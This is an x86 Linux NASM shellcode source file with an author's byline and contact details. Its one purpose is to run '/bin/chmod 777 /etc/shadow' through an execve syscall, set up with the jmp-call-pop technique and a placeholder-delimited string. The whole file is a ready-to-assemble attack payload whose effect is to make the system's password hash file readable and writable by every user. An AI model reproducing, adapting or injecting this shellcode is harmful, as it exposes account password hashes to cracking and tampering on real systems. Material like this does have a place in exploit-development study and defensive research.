; Filename: chmod777etcshadow.nasm
; Author:  Kwisaba Hamza ([at] evil_comrade)
; sulleyfidempa [at] yahoo [dot] com
; 1evilcomrade [dot] blogspot [dot] com
; /bin/chmod 777 /etc/shadow
; 


global _start
section .text
_start:


jmp short       callme

shellcode:   

	pop             esi
	xor             eax, eax
	mov byte        [esi + 10], al    
	mov byte        [esi + 14], al   
	mov byte        [esi + 26], al    
	mov long        [esi + 28], esi   
	lea             ebx, [esi + 11]   
	mov long        [esi + 32], ebx   
	lea             ebx, [esi + 15]   
	mov long        [esi + 36], ebx   
	mov long        [esi + 40], eax  
	mov byte        al, 0x0b          
	mov             ebx, esi          
	lea             ecx, [esi + 28]   
	lea             edx, [esi + 40]  
	int             0x80              

callme:
	call shellcode
	db  '/bin/chmod#777#/etc/shadow#AAAABBBBCCCCDDDD'

